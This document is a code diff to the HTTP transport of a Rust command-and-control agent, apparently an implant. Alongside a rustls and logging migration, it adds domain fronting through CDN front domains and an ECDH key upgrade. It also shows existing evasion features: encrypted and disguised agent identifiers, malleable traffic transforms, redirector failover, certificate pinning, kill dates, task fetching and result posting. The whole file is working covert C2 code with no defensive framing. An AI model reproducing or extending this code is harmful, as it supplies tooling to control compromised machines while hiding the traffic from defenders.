@@ -20,15 +20,20 @@
 //! 1. Strip prepend bytes from the response body
 //! 2. Strip append bytes from the response body
 //! 3. Apply the inverse server transform
-//! 4. Decrypt with the session's XChaCha20-Poly1305 key
+//! 4. Decrypt with the session's AES-256-GCM key
 //!
 //! ## Security
 //!
 //! - The `agent_id` is NEVER sent in plaintext — it goes through the
 //!   metadata transform pipeline (base64/netbios/etc.) before transmission.
 //! - SSL certificate pinning is enforced when `profile.ssl.cert_pin` is set.
-//! - TLS SNI is set from `profile.ssl.sni`.
+//! - Domain fronting rewrites the URL hostname to the front domain (which
+//!   reqwest then uses as TLS SNI) while setting the HTTP Host header to
+//!   the real C2 domain. If `front_domain` is not provided, `profile.ssl.sni`
+//!   is used as a fallback. reqwest does not provide per-request SNI control;
+//!   the URL-rewrite approach is the only portable mechanism.
 
+use common::lock::MutexExt;
 use anyhow::{anyhow, Result};
 use async_trait::async_trait;
 use base64::Engine;
@@ -60,8 +65,9 @@ pub struct RedirectorConfig {
     /// Which malleable profile this redirector expects.
     pub profile_name: String,
     /// Domain fronting domain for this specific redirector. When set, the
-    /// agent's TLS SNI uses this domain while the HTTP Host header carries
-    /// the redirector's actual domain. This overrides the global
+    /// agent rewrites the request URL to use this domain as the hostname
+    /// (causing reqwest to send it as TLS SNI) while setting the HTTP Host
+    /// header to the redirector's actual domain. This overrides the global
     /// `front_domain` on `HttpTransport` for connections to this redirector.
     pub front_domain: Option<String>,
 }
@@ -144,7 +150,7 @@ impl FailoverState {
     fn record_success(&mut self) {
         self.backoff_secs = 1;
         self.sticky_count += 1;
-        log::debug!(
+        tracing::debug!(
             "connection success on {:?} (sticky {}/{})",
             self.active_variant_str(),
             self.sticky_count,
@@ -155,7 +161,7 @@ impl FailoverState {
     /// Record a failure and advance to the next endpoint.
     /// Returns the backoff duration to wait before retrying.
     fn record_failure_and_advance(&mut self) -> Duration {
-        log::warn!(
+        tracing::warn!(
             "connection failed on {}; advancing to next endpoint",
             self.current_url(),
         );
@@ -189,7 +195,7 @@ impl FailoverState {
         if self.sticky_count >= Self::STICKY_LIMIT {
             // Reset sticky counter; stay on the same endpoint.
             self.sticky_count = 0;
-            log::debug!(
+            tracing::debug!(
                 "sticky limit reached on {}; resetting counter",
                 self.current_url(),
             );
@@ -251,20 +257,20 @@ fn days_to_ymd(days: u64) -> (u32, u32, u32) {
 /// CA-based verification.
 struct FingerprintVerifier {
     expected_fingerprint: Option<String>,
-    webpki: rustls_0_21::client::WebPkiVerifier,
+    webpki: rustls::client::WebPkiVerifier,
 }
 
 impl FingerprintVerifier {
     fn new(expected_fingerprint: Option<String>) -> Self {
-        let mut root_store = rustls_0_21::RootCertStore::empty();
+        let mut root_store = rustls::RootCertStore::empty();
         for cert in rustls_native_certs::load_native_certs()
             .certs
             .into_iter()
-            .map(|c| rustls_0_21::Certificate(c.as_ref().to_vec()))
+            .map(|c| rustls::pki_types::CertificateDer::from(c.as_ref().to_vec()))
         {
-            root_store.add(&cert).ok();
+            root_store.add(cert).ok();
         }
-        let webpki = rustls_0_21::client::WebPkiVerifier::new(root_store, None);
+        let webpki = rustls::client::WebPkiVerifier::new(root_store, None);
         Self {
             expected_fingerprint,
             webpki,
@@ -272,18 +278,17 @@ impl FingerprintVerifier {
     }
 }
 
-impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
+impl rustls::client::danger::ServerCertVerifier for FingerprintVerifier {
     fn verify_server_cert(
         &self,
-        end_entity: &rustls_0_21::Certificate,
-        intermediates: &[rustls_0_21::Certificate],
-        server_name: &rustls_0_21::ServerName,
-        scts: &mut dyn Iterator<Item = &[u8]>,
+        end_entity: &rustls::pki_types::CertificateDer<'_>,
+        intermediates: &[rustls::pki_types::CertificateDer<'_>],
+        server_name: &rustls::pki_types::ServerName<'_>,
         ocsp_response: &[u8],
-        now: std::time::SystemTime,
-    ) -> Result<rustls_0_21::client::ServerCertVerified, rustls_0_21::Error> {
+        now: rustls::pki_types::UnixTime,
+    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
         // Always compute the fingerprint of the end-entity certificate.
-        let digest = Sha256::digest(&end_entity.0);
+        let digest = Sha256::digest(end_entity.as_ref());
         let hex_fp = hex::encode(digest);
 
         if let Some(ref expected) = self.expected_fingerprint {
@@ -292,29 +297,28 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
             // that could brute-force the expected fingerprint byte-by-byte.
             let expected_lower = expected.to_lowercase();
             if !bool::from(hex_fp.as_bytes().ct_eq(expected_lower.as_bytes())) {
-                log::error!("cert pinning: fingerprint mismatch — rejecting connection");
-                return Err(rustls_0_21::Error::InvalidCertificate(
-                    rustls_0_21::CertificateError::UnknownIssuer,
+                tracing::error!("cert pinning: fingerprint mismatch — rejecting connection");
+                return Err(rustls::Error::InvalidCertificate(
+                    rustls::CertificateError::ApplicationVerificationFailure,
                 ));
             }
             // P2-14: Validate SAN/hostname in addition to fingerprint checking.
-            if !verify_cert_hostname_rustls021(&end_entity.0, server_name) {
-                log::error!("cert pinning: fingerprint matched but hostname validation failed");
-                return Err(rustls_0_21::Error::InvalidCertificate(
-                    rustls_0_21::CertificateError::NotValidForName,
+            if !common::tls_transport::verify_cert_hostname(end_entity.as_ref(), server_name) {
+                tracing::error!("cert pinning: fingerprint matched but hostname validation failed");
+                return Err(rustls::Error::InvalidCertificate(
+                    rustls::CertificateError::NotValidForName,
                 ));
             }
             // Fingerprint matches — accept the certificate without CA chain
             // validation since we are pinning the exact cert.
-            log::debug!("cert pinning: fingerprint verified OK");
-            Ok(rustls_0_21::client::ServerCertVerified::assertion())
+            tracing::debug!("cert pinning: fingerprint verified OK");
+            Ok(rustls::client::danger::ServerCertVerified::assertion())
         } else {
             // No fingerprint configured — fall back to standard WebPKI verification.
             self.webpki.verify_server_cert(
                 end_entity,
                 intermediates,
                 server_name,
-                scts,
                 ocsp_response,
                 now,
             )
@@ -324,260 +328,24 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
     fn verify_tls12_signature(
         &self,
         message: &[u8],
-        cert: &rustls_0_21::Certificate,
-        dss: &rustls_0_21::DigitallySignedStruct,
-    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
+        cert: &rustls::pki_types::CertificateDer<'_>,
+        dss: &rustls::DigitallySignedStruct,
+    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
         self.webpki.verify_tls12_signature(message, cert, dss)
     }
 
     fn verify_tls13_signature(
         &self,
         message: &[u8],
-        cert: &rustls_0_21::Certificate,
-        dss: &rustls_0_21::DigitallySignedStruct,
-    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
+        cert: &rustls::pki_types::CertificateDer<'_>,
+        dss: &rustls::DigitallySignedStruct,
+    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
         self.webpki.verify_tls13_signature(message, cert, dss)
     }
-}
 
-/// P2-14: Verify that the certificate's SAN or CN matches the expected server name.
-///
-/// P1-06: Made `pub(crate)` so `c2_doh::FingerprintVerifier` can reuse the
-/// same hostname validation logic instead of duplicating DER parsing.
-pub(crate) fn verify_cert_hostname_rustls021(
-    der: &[u8],
-    server_name: &rustls_0_21::ServerName,
-) -> bool {
-    let expected = match server_name {
-        rustls_0_21::ServerName::DnsName(dns) => dns.as_ref().to_ascii_lowercase(),
-        _ => return true, // IP address or other — skip hostname check
-    };
-
-    // Minimal DER parsing for SAN and CN extraction.
-    if let Some(sans) = extract_san_dns_names_minimal(der) {
-        for san in &sans {
-            if san == &expected || match_wildcard_rustls021(san, &expected) {
-                return true;
-            }
-        }
-        log::warn!(
-            "c2_http: hostname {} not found in SANs: {:?}",
-            expected,
-            sans
-        );
-        return false;
+    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
+        self.webpki.supported_verify_schemes()
     }
-    if let Some(cn) = extract_cn_minimal(der) {
-        if cn == expected || match_wildcard_rustls021(&cn, &expected) {
-            return true;
-        }
-        log::warn!("c2_http: hostname {} does not match CN {}", expected, cn);
-        return false;
-    }
-    log::warn!("c2_http: no SAN or CN found for hostname validation");
-    false
-}
-
-/// Match wildcard `*.example.com` against `sub.example.com`.
-fn match_wildcard_rustls021(pattern: &str, name: &str) -> bool {
-    if !pattern.starts_with("*.") {
-        return false;
-    }
-    let suffix = &pattern[1..];
-    if let Some(dot_pos) = name.find('.') {
-        name[dot_pos..] == *suffix
-    } else {
-        false
-    }
-}
-
-/// Extract dNSName entries from SAN extension using minimal DER parsing.
-fn extract_san_dns_names_minimal(der: &[u8]) -> Option<Vec<String>> {
-    let san_oid: &[u8] = &[0x55, 0x1d, 0x11];
-    let ext = find_extension_minimal(der, san_oid)?;
-
-    let mut pos = 0usize;
-    // OCTET STRING wrapper.
-    if ext.get(pos)? != &0x04 {
-        return None;
-    }
-    pos = skip_len(ext, pos)?;
-
-    // SEQUENCE of GeneralNames.
-    if ext.get(pos)? != &0x30 {
-        return None;
-    }
-    let seq_end = {
-        let (vs, vl) = read_len(ext, pos + 1)?;
-        vs + vl
-    };
-    pos = read_len(ext, pos + 1)?.0;
-
-    let mut names = Vec::new();
-    while pos < seq_end.min(ext.len()) {
-        let tag = *ext.get(pos)?;
-        pos += 1;
-        let (vs, vl) = read_len(ext, pos)?;
-        pos = vs + vl;
-        if tag == 0x82 {
-            // dNSName [2]
-            if let Ok(s) = std::str::from_utf8(&ext[vs..vs + vl]) {
-                names.push(s.to_ascii_lowercase());
-            }
-        }
-    }
-    if names.is_empty() {
-        None
-    } else {
-        Some(names)
-    }
-}
-
-/// Extract Common Name from Subject field.
-fn extract_cn_minimal(der: &[u8]) -> Option<String> {
-    let cn_oid: &[u8] = &[0x55, 0x04, 0x03];
-    let mut p = enter_seq_min(der, 0)?;
-    p = enter_seq_min(der, p)?;
-    if der.get(p) == Some(&0xa0) {
-        p = skip_tlv_min(der, p)?;
-    }
-    p = skip_tlv_min(der, p)?; // serial
-    p = skip_tlv_min(der, p)?; // sig algo
-    p = skip_tlv_min(der, p)?; // issuer
-    let subject_end = {
-        let (vs, vl) = read_len(der, p + 1)?;
-        vs + vl
-    };
-    let mut pos = enter_seq_min(der, p)?;
-    while pos < subject_end.min(der.len()) {
-        if der.get(pos) != Some(&0x31) {
-            pos = skip_tlv_min(der, pos)?;
-            continue;
-        }
-        let mut inner = enter_seq_min(der, pos)?;
-        let set_end = {
-            let (vs, vl) = read_len(der, pos + 1)?;
-            vs + vl
-        };
-        while inner < set_end.min(der.len()) {
-            if der.get(inner) != Some(&0x30) {
-                inner = skip_tlv_min(der, inner)?;
-                continue;
-            }
-            let attr_end = {
-                let (vs, vl) = read_len(der, inner + 1)?;
-                vs + vl
-            };
-            let mut ap = read_len(der, inner + 1)?.0;
-            if der.get(ap) != Some(&0x06) {
-                inner = attr_end;
-                continue;
-            }
-            let (os, ol) = read_len(der, ap + 1)?;
-            if &der[os..os + ol] == cn_oid {
-                let vp = os + ol;
-                let vt = *der.get(vp)?;
-                let (vs, vl) = read_len(der, vp + 1)?;
-                if vt == 0x0c || vt == 0x13 {
-                    return std::str::from_utf8(&der[vs..vs + vl])
-                        .ok()
-                        .map(|s| s.to_ascii_lowercase());
-                }
-            }
-            inner = attr_end;
-        }
-        pos = set_end;
-    }
-    None
-}
-
-/// Find an extension by OID in the certificate.
-fn find_extension_minimal<'a>(der: &'a [u8], oid: &[u8]) -> Option<&'a [u8]> {
-    let mut p = enter_seq_min(der, 0)?;
-    p = enter_seq_min(der, p)?;
-    if der.get(p) == Some(&0xa0) {
-        p = skip_tlv_min(der, p)?;
-    }
-    p = skip_tlv_min(der, p)?; // serial
-    p = skip_tlv_min(der, p)?; // sig algo
-    p = skip_tlv_min(der, p)?; // issuer
-    p = skip_tlv_min(der, p)?; // validity
-    p = skip_tlv_min(der, p)?; // subject
-    p = skip_tlv_min(der, p)?; // spki
-    if der.get(p) != Some(&0xa3) {
-        return None;
-    } // extensions [3]
-    let (ext_start, ext_len) = read_len(der, p + 1)?;
-    let ext_end = ext_start + ext_len;
-    let mut pos = ext_start;
-    if der.get(pos) != Some(&0x30) {
-        return None;
-    }
-    let (ss, sl) = read_len(der, pos + 1)?;
-    let seq_end = ss + sl;
-    pos = ss;
-    while pos < seq_end.min(ext_end).min(der.len()) {
-        if der.get(pos) != Some(&0x30) {
-            pos = skip_tlv_min(der, pos)?;
-            continue;
-        }
-        let ext_seq_end = {
-            let (vs, vl) = read_len(der, pos + 1)?;
-            vs + vl
-        };
-        let mut ep = read_len(der, pos + 1)?.0;
-        if der.get(ep) != Some(&0x06) {
-            pos = ext_seq_end;
-            continue;
-        }
-        let (os, ol) = read_len(der, ep + 1)?;
-        if &der[os..os + ol] == oid {
-            ep = os + ol;
-            if der.get(ep) == Some(&0x01) {
-                ep = skip_tlv_min(der, ep)?;
-            }
-            if der.get(ep) == Some(&0x04) {
-                let (vs, vl) = read_len(der, ep + 1)?;
-                return Some(&der[vs..vs + vl]);
-            }
-        }
-        pos = ext_seq_end;
-    }
-    None
-}
-
-fn read_len(buf: &[u8], pos: usize) -> Option<(usize, usize)> {
-    let first = *buf.get(pos)?;
-    if first & 0x80 == 0 {
-        Some((pos + 1, first as usize))
-    } else {
-        let n = (first & 0x7f) as usize;
-        if n == 0 || n > 4 || pos + 1 + n > buf.len() {
-            return None;
-        }
-        let mut l = 0usize;
-        for i in 0..n {
-            l = (l << 8) | buf[pos + 1 + i] as usize;
-        }
-        Some((pos + 1 + n, l))
-    }
-}
-
-fn skip_len(buf: &[u8], pos: usize) -> Option<usize> {
-    let (vs, vl) = read_len(buf, pos + 1)?;
-    Some(vs + vl)
-}
-
-fn skip_tlv_min(buf: &[u8], pos: usize) -> Option<usize> {
-    let (vs, vl) = read_len(buf, pos + 1)?;
-    Some(vs + vl)
-}
-
-fn enter_seq_min(buf: &[u8], pos: usize) -> Option<usize> {
-    if buf.get(pos)? != &0x30 {
-        return None;
-    }
-    read_len(buf, pos + 1).map(|(vs, _)| vs)
 }
 
 // ── HTTP Transport ───────────────────────────────────────────────────────────
@@ -597,14 +365,23 @@ fn enter_seq_min(buf: &[u8], pos: usize) -> Option<usize> {
 ///
 /// ## Domain Fronting
 ///
-/// When `front_domain` is set, the TLS SNI is set to the front domain
-/// (e.g. "cdn.azure.com") while the HTTP Host header carries the actual
-/// redirector/C2 domain. This requires the redirector to be hosted on a
-/// CDN that supports domain fronting.
+/// When `front_domain` (or `profile.ssl.sni` as a fallback) is set, the
+/// agent rewrites the request URL hostname to the front domain (e.g.
+/// "cdn.azure.com"), which reqwest uses as the TLS SNI. The HTTP Host
+/// header is set explicitly to the actual redirector/C2 domain. This
+/// requires the CDN to route traffic for the front domain to the real
+/// backend. reqwest does not provide per-request SNI control; the URL
+/// rewrite is the only portable mechanism.
 pub struct HttpTransport {
     profile: Arc<AgentMalleableProfile>,
     client: reqwest::Client,
     session: CryptoSession,
+    /// ECDH forward-secrecy state.  `Some` while the ECDH handshake is in
+    /// progress (i.e. we have not yet received a server response with the
+    /// `X-ECDH-Pub` header).  Set to `None` once the session key has been
+    /// derived from the ECDH exchange.  If the server does not support ECDH
+    /// (no header in response), we continue using the PSK-derived session.
+    ecdh_client: Option<std::sync::Mutex<common::forward_secrecy::HttpEcdhClient>>,
     agent_id: String,
     /// Optional mesh public key attached to heartbeat-style checkins.
     mesh_public_key: Option<[u8; 32]>,
@@ -621,15 +398,21 @@ pub struct HttpTransport {
     cdn_endpoint: String,
     direct_c2_endpoint: String,
     host_header: String,
-    /// Domain fronting: if set, TLS SNI uses this domain while the Host
-    /// header carries the actual C2/redirector domain. This is the global
-    /// default; individual redirectors may override it via their own
-    /// `front_domain` field.
+    /// Domain fronting: if set, the request URL hostname is rewritten to this
+    /// domain (causing reqwest to use it as TLS SNI) while the Host header
+    /// carries the actual C2/redirector domain. This is the global default;
+    /// individual redirectors may override it via their own `front_domain`
+    /// field. Falls back to `profile.ssl.sni` if not explicitly provided.
     front_domain: Option<String>,
-    /// Per-redirector HTTP clients. Each entry maps a redirector URL to a\n    /// dedicated reqwest client whose TLS SNI is configured for that
-    /// redirector's `front_domain` (or the global `front_domain` if the
-    /// redirector doesn't specify one). The default `client` is used for
-    /// direct C2 connections and for redirectors without domain fronting.
+    /// Per-redirector HTTP clients. Each entry maps a redirector URL to a
+    /// dedicated reqwest client for redirectors that use domain fronting.
+    /// The actual SNI rewriting happens at request-build time via URL
+    /// hostname substitution (see `build_fronted_request_with_client`), not
+    /// via any per-client TLS configuration — reqwest does not expose SNI
+    /// as a per-client setting. Separate clients are maintained for future
+    /// flexibility (e.g. per-redirector TLS fingerprints). The default
+    /// `client` is used for direct C2 connections and for redirectors
+    /// without domain fronting.
     per_redirector_clients: std::collections::HashMap<String, reqwest::Client>,
     /// Redirector chain failover state.
     failover: std::sync::Mutex<FailoverState>,
@@ -647,9 +430,14 @@ impl HttpTransport {
     /// The `common_profile` parameter provides legacy fields (kill_date,
     /// CDN relay, endpoints) that are not yet part of the malleable profile
     /// struct. In a full refactor these would be folded into the profile.
+    ///
+    /// The `psk` parameter is the pre-shared secret used for ECDH forward
+    /// secrecy.  An ephemeral X25519 keypair is generated and the public key
+    /// is sent in the `X-ECDH-Pub` header on every request until the server
+    /// responds with its own key, at which point the session key is derived.
     pub async fn new(
         profile: Option<&AgentMalleableProfile>,
-        session: CryptoSession,
+        psk: &str,
         agent_id: String,
         mesh_public_key: Option<[u8; 32]>,
         common_profile: Option<&common::config::MalleableProfile>,
@@ -657,6 +445,22 @@ impl HttpTransport {
         front_domain: Option<String>,
     ) -> Result<Self> {
         let profile = profile.cloned().unwrap_or_default();
+
+        // Resolve effective front_domain: explicit parameter takes precedence,
+        // then fall back to profile.ssl.sni (the malleable profile's SNI field).
+        // This ensures that if the operator configures `sni` in the profile
+        // but does not pass an explicit front_domain, domain fronting still
+        // works by rewriting the URL hostname to the profile SNI value.
+        let front_domain = front_domain.or_else(|| {
+            let sni = profile.ssl.sni.trim().to_string();
+            if sni.is_empty() {
+                None
+            } else {
+                tracing::info!("c2_http: using profile.ssl.sni ({}) as front_domain", sni);
+                Some(sni)
+            }
+        });
+
         // Extract legacy config fields if provided.
         let kill_date = common_profile
             .map(|p| p.kill_date.clone())
@@ -677,6 +481,14 @@ impl HttpTransport {
             check_kill_date(&kill_date)?;
         }
 
+        // PSK-derived fallback session for backward compatibility with servers
+        // that do not support ECDH.  Upgraded below when the server responds
+        // with an X-ECDH-Pub header.
+        let session = CryptoSession::from_shared_secret(psk.as_bytes());
+        let ecdh_client = Some(std::sync::Mutex::new(
+            common::forward_secrecy::HttpEcdhClient::new(psk.as_bytes()),
+        ));
+
         // Build default headers from the legacy config.
         // NOTE: Host header is NOT baked into default headers here.
         // It is applied per-request to avoid duplicate Host headers when
@@ -692,14 +504,15 @@ impl HttpTransport {
             None
         };
 
-        // If domain fronting is configured, we must use a TLS client that
-        // sends the front_domain as SNI but resolves to the actual endpoint.
-        // reqwest doesn't support split SNI/resolution natively, so we use
-        // the front_domain as the TLS SNI via a custom connector.
+        // If domain fronting is configured, we rewrite the URL hostname at
+        // request-build time so reqwest sends the front_domain as TLS SNI.
+        // reqwest doesn't support split SNI/resolution per-request; separate
+        // client instances are created for redirectors with domain fronting
+        // for future per-client TLS flexibility (e.g. JA3 fingerprints).
         let client = if cert_fingerprint.is_some() {
             let verifier = FingerprintVerifier::new(cert_fingerprint.clone());
-            let config = rustls_0_21::ClientConfig::builder()
-                .with_safe_defaults()
+            let config = rustls::ClientConfig::builder()
+                .dangerous()
                 .with_custom_certificate_verifier(Arc::new(verifier))
                 .with_no_client_auth();
             reqwest::Client::builder()
@@ -746,8 +559,8 @@ impl HttpTransport {
                 // need a standard TLS client here.
                 let redir_client = if cert_fingerprint.is_some() {
                     let verifier = FingerprintVerifier::new(cert_fingerprint.clone());
-                    let config = rustls_0_21::ClientConfig::builder()
-                        .with_safe_defaults()
+                    let config = rustls::ClientConfig::builder()
+                        .dangerous()
                         .with_custom_certificate_verifier(Arc::new(verifier))
                         .with_no_client_auth();
                     reqwest::Client::builder()
@@ -768,6 +581,7 @@ impl HttpTransport {
             profile: Arc::new(profile.clone()),
             client,
             session,
+            ecdh_client,
             agent_id,
             mesh_public_key,
             get_uri_idx: AtomicUsize::new(0),
@@ -801,7 +615,7 @@ impl HttpTransport {
     /// Returns the URL of the current endpoint (redirector or direct C2),
     /// applying sticky session logic and domain fronting as needed.
     fn resolve_endpoint(&self) -> Result<String> {
-        let mut failover = self.failover.lock().unwrap();
+        let mut failover = self.failover.lock_recover();
         failover.maybe_reconsider();
         let url = failover.current_url().to_string();
         if url.is_empty() {
@@ -812,10 +626,10 @@ impl HttpTransport {
 
     /// Build a request with domain-fronting support if configured.
     ///
-    /// When `front_domain` is set, the TLS SNI will use the front domain
-    /// while the Host header carries the actual C2/redirector domain.
-    /// reqwest uses the URL for TLS SNI, so we must rewrite the URL to
-    /// use the front_domain for the hostname, then set Host explicitly.
+    /// When `front_domain` is set, the request URL hostname is rewritten to
+    /// the front domain so reqwest sends it as the TLS SNI, and the Host
+    /// header is set explicitly to the actual C2/redirector domain. reqwest
+    /// derives SNI from the URL hostname — there is no per-request SNI API.
     ///
     /// `client` is the reqwest client to use (either the default or a
     /// per-redirector client). `front` is the domain to use for TLS SNI.
@@ -826,9 +640,21 @@ impl HttpTransport {
         front: &str,
     ) -> reqwest::RequestBuilder {
         // Parse the URL to extract the path/query/fragment.
-        let parsed: url::Url = url
-            .parse()
-            .unwrap_or_else(|_| format!("https://{}", url).parse().unwrap());
+        // If the URL cannot be parsed as-is, try prepending "https://".
+        // If that also fails, fall back to using front as the host.
+        let parsed: url::Url = match url.parse() {
+            Ok(u) => u,
+            Err(_) => match format!("https://{}", url).parse() {
+                Ok(u) => u,
+                Err(_) => {
+                    tracing::warn!("c2_http: failed to parse URL '{}' for fronting; using front as host", url);
+                    format!("https://{}/", front).parse().unwrap_or_else(|_| {
+                        // Last resort: this URL is hardcoded and always valid.
+                        url::Url::parse("https://localhost/").expect("hardcoded URL must parse")
+                    })
+                }
+            },
+        };
         let actual_host = parsed.host_str().unwrap_or("").to_string();
 
         // Rewrite URL with the front domain as the hostname.
@@ -844,9 +670,9 @@ impl HttpTransport {
     /// and domain fronting.
     ///
     /// If the current endpoint is a redirector with a per-redirector client
-    /// (built with domain-fronting TLS config), that client is used instead of
-    /// the default client. Similarly, a per-redirector `front_domain` overrides
-    /// the global one.
+    /// (a dedicated client instance for domain-fronting redirectors), that
+    /// client is used instead of the default client. Similarly, a
+    /// per-redirector `front_domain` overrides the global one.
     fn build_request_for_endpoint(
         &self,
         method: reqwest::Method,
@@ -855,7 +681,7 @@ impl HttpTransport {
     ) -> reqwest::RequestBuilder {
         let full_url = format!("{}{}", endpoint, uri);
 
-        let failover = self.failover.lock().unwrap();
+        let failover = self.failover.lock_recover();
 
         // Determine the effective front domain: per-redirector overrides global.
         let per_redirector_front = failover.current_front_domain().map(|s| s.to_string());
@@ -988,11 +814,74 @@ impl HttpTransport {
 
     /// Build the encrypted session token for the agent_id.
     ///
-    /// The agent_id is encrypted with the session's XChaCha20-Poly1305 key,
+    /// The agent_id is encrypted with the session's AES-256-GCM key,
     /// then base64 encoded. It is NEVER sent in plaintext.
     fn encrypt_agent_id(&self) -> String {
         let ciphertext = self.session.encrypt(self.agent_id.as_bytes());
         base64::engine::general_purpose::STANDARD.encode(&ciphertext)
+    }
+
+    /// Build the ECDH header value to include in outgoing requests.
+    ///
+    /// Returns `None` if the ECDH handshake has already completed (i.e.
+    /// the session key has been derived from a server response).
+    fn ecdh_header_value(&self) -> Option<String> {
+        self.ecdh_client.as_ref().map(|m| m.lock_recover().header_value())
+    }
+
+    /// Attempt to upgrade the session key from the server's ECDH response.
+    ///
+    /// If the response contains an `X-ECDH-Pub` header and the ECDH client
+    /// is still active (handshake not yet completed), derive the forward-
+    /// secrecy session key and replace the PSK-derived fallback session.
+    ///
+    /// If the header is missing or ECDH has already completed, this is a
+    /// no-op — the existing session (PSK-derived or previously ECDH-derived)
+    /// continues to be used.
+    fn try_ecdh_upgrade(&mut self, resp_headers: &reqwest::header::HeaderMap) {
+        if self.ecdh_client.is_none() {
+            // ECDH already completed — nothing to do.
+            return;
+        }
+
+        let ecdh_header = match resp_headers.get(common::forward_secrecy::ECDH_HEADER_NAME) {
+            Some(v) => match v.to_str() {
+                Ok(s) => s.to_string(),
+                Err(_) => return,
+            },
+            None => {
+                // Server did not send ECDH header — keep using PSK session.
+                tracing::debug!("server did not send ECDH header; keeping PSK-derived session");
+                return;
+            }
+        };
+
+        // Derive the forward-secrecy session key from the ECDH exchange.
+        let ecdh_mutex = match self.ecdh_client.take() {
+            Some(m) => m,
+            None => {
+                tracing::debug!("c2_http: ECDH client already consumed; skipping upgrade");
+                return;
+            }
+        };
+        let mut client = match ecdh_mutex.into_inner() {
+            Ok(c) => c,
+            Err(e) => {
+                tracing::warn!("c2_http: ECDH mutex poisoned during upgrade: {e}; recovering client");
+                e.into_inner()
+            }
+        };
+        match client.derive_session_from_response(&ecdh_header) {
+            Ok(session) => {
+                tracing::info!("HTTP ECDH handshake completed — forward-secrecy session established");
+                self.session = session;
+            }
+            Err(e) => {
+                tracing::warn!("HTTP ECDH handshake failed: {e}; keeping PSK-derived session");
+                // Put the client back so we can retry on the next response.
+                self.ecdh_client = Some(std::sync::Mutex::new(client));
+            }
+        }
     }
 
     /// Apply the metadata delivery mechanism to embed the agent identifier.
@@ -1004,7 +893,7 @@ impl HttpTransport {
     /// # Pipeline
     ///
     /// ```text
-    /// agent_id bytes → encrypt (XChaCha20-Poly1305) → base64 → "encrypted_id"
+    /// agent_id bytes → encrypt (AES-256-GCM) → base64 → "encrypted_id"
     /// encrypted_id → metadata.transform.encode() → "transformed_id"
     /// transformed_id → placed via metadata.delivery (Cookie/UriAppend/Header/Body)
     /// ```
@@ -1097,7 +986,7 @@ impl HttpTransport {
                         response_bytes.to_vec()
                     }
                 } else {
-                    log::warn!(
+                    tracing::warn!(
                         "output delivery=Header but header '{}' not found in response",
                         key
                     );
@@ -1124,7 +1013,7 @@ impl HttpTransport {
                         }
                     }
                 }
-                log::warn!(
+                tracing::warn!(
                     "output delivery=Cookie but '{}' not found in Set-Cookie",
                     key
                 );
@@ -1132,7 +1021,7 @@ impl HttpTransport {
             }
             DeliveryMethod::UriAppend => {
                 // Not applicable for server responses — fall back to body.
-                log::warn!("output delivery=UriAppend is not applicable for responses, falling back to body");
+                tracing::warn!("output delivery=UriAppend is not applicable for responses, falling back to body");
                 response_bytes.to_vec()
             }
         }
@@ -1259,7 +1148,7 @@ impl HttpTransport {
                     return Ok(resp);
                 }
                 Err(e) => {
-                    log::warn!(
+                    tracing::warn!(
                         "HTTP connection failed: {}. Retrying in {}s...",
                         e,
                         current_delay
@@ -1279,7 +1168,7 @@ impl HttpTransport {
 #[async_trait]
 impl Transport for HttpTransport {
     async fn send(&mut self, msg: Message) -> Result<()> {
-        log::debug!("Malleable HTTP C2 Send (result delivery)");
+        tracing::debug!("Malleable HTTP C2 Send (result delivery)");
 
         // Enforce kill date on every send cycle.
         if !self.kill_date.is_empty() {
@@ -1297,7 +1186,7 @@ impl Transport for HttpTransport {
         let uri = Self::next_uri(txn, &self.post_uri_idx);
 
         // Serialize and encrypt payload through the session's forward-secrecy layer.
-        let serialized = bincode::serialize(&msg)?;
+        let serialized = bincode::serde::encode_to_vec(&msg, bincode::config::legacy())?;
         let ciphertext = self.session.encrypt(&serialized);
 
         // Apply the client transform pipeline.
@@ -1332,14 +1221,22 @@ impl Transport for HttpTransport {
 
         let req = req.body(body.clone());
 
+        // Attach ECDH header if forward-secrecy handshake is still pending.
+        let req = match self.ecdh_header_value() {
+            Some(val) => req.header(common::forward_secrecy::ECDH_HEADER_NAME, val),
+            None => req,
+        };
+
         let result = self.connect_with_retry(req, "http_post").await;
         match result {
             Ok(resp) => {
                 // Record success for sticky session.
-                self.failover.lock().unwrap().record_success();
+                self.failover.lock_recover().record_success();
                 if !resp.status().is_success() {
                     anyhow::bail!("C2 POST returned HTTP {}", resp.status());
                 }
+                // Attempt ECDH session upgrade from server response.
+                self.try_ecdh_upgrade(resp.headers());
                 // Observe the outbound traffic for adaptive timing.
                 #[cfg(feature = "adaptive-timing")]
                 self.observe_traffic(
@@ -1355,10 +1252,10 @@ impl Transport for HttpTransport {
             Err(e) => {
                 // Record failure and advance to next endpoint.
                 let backoff = {
-                    let mut fo = self.failover.lock().unwrap();
+                    let mut fo = self.failover.lock_recover();
                     fo.record_failure_and_advance()
                 };
-                log::warn!(
+                tracing::warn!(
                     "send failed on {}: {}. Backing off {:?}",
                     endpoint,
                     e,
@@ -1371,7 +1268,7 @@ impl Transport for HttpTransport {
     }
 
     async fn recv(&mut self) -> Result<Message> {
-        log::debug!("Malleable HTTP C2 Recv (task fetch)");
+        tracing::debug!("Malleable HTTP C2 Recv (task fetch)");
 
         // Enforce kill date on every recv cycle.
         if !self.kill_date.is_empty() {
@@ -1390,7 +1287,7 @@ impl Transport for HttpTransport {
 
         // ── OPSEC: agent_id is never transmitted in plaintext. ─────────
         //
-        // The agent_id is encrypted with the session's XChaCha20-Poly1305 key,
+        // The agent_id is encrypted with the session's AES-256-GCM key,
         // then base64 encoded. The resulting ciphertext goes through the
         // metadata delivery pipeline (Cookie/UriAppend/Header/Body).
         let encrypted_id = self.encrypt_agent_id();
@@ -1406,7 +1303,7 @@ impl Transport for HttpTransport {
             status: "idle".to_string(),
             mesh_public_key: self.mesh_public_key,
         };
-        let serialized = bincode::serialize(&heartbeat)?;
+        let serialized = bincode::serde::encode_to_vec(&heartbeat, bincode::config::legacy())?;
